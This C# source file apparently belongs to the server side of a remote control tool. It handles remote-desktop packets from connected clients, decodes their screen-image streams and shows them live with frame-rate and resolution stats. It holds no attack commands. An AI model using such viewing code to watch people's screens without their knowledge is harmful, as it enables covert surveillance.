﻿using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Server.Connection;
using Server.Forms;
using Server.Helper;
using Server.MessagePack;

namespace Server.Handle_Packet
{
    public class HandleRemoteDesktop
    {
        public void Capture(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                var RD = (FormRemoteDesktop)Application.OpenForms[
                    "RemoteDesktop:" + unpack_msgpack.ForcePathObject("ID").AsString];
                try
                {
                    if (RD != null)
                    {
                        if (RD.Client == null)
                        {
                            RD.Client = client;
                            RD.labelWait.Visible = false;
                            RD.timer1.Start();
                            var RdpStream0 = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                            var decoded0 = RD.decoder.DecodeData(new MemoryStream(RdpStream0));
                            RD.rdSize = decoded0.Size;
                            var Screens = Convert.ToInt32(unpack_msgpack.ForcePathObject("Screens").GetAsInteger());
                            RD.numericUpDown2.Maximum = Screens - 1;
                        }

                        var RdpStream = unpack_msgpack.ForcePathObject("Stream").GetAsBytes();
                        lock (RD.syncPicbox)
                        {
                            using (var stream = new MemoryStream(RdpStream))
                            {
                                var StreamDecodeData = RD.decoder.DecodeData(stream);
                                RD.GetImage = StreamDecodeData;
                                RD.rdSize = StreamDecodeData.Size;
                            }

                            RD.pictureBox1.Image = RD.GetImage;
                            RD.FPS++;
                            if (RD.sw.ElapsedMilliseconds >= 1000)
                            {
                                RD.Text = "RemoteDesktop:" + client.ID + "    FPS:" + RD.FPS + "    Screen:" +
                                          RD.GetImage.Width + " x " + RD.GetImage.Height + "    Size:" +
                                          Methods.BytesToString(RdpStream.Length);
                                RD.FPS = 0;
                                RD.sw = Stopwatch.StartNew();
                            }
                        }
                    }
                    else
                    {
                        client.Disconnected();
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine(ex.Message);
                }
            }
            catch
            {
            }
        }
    }
}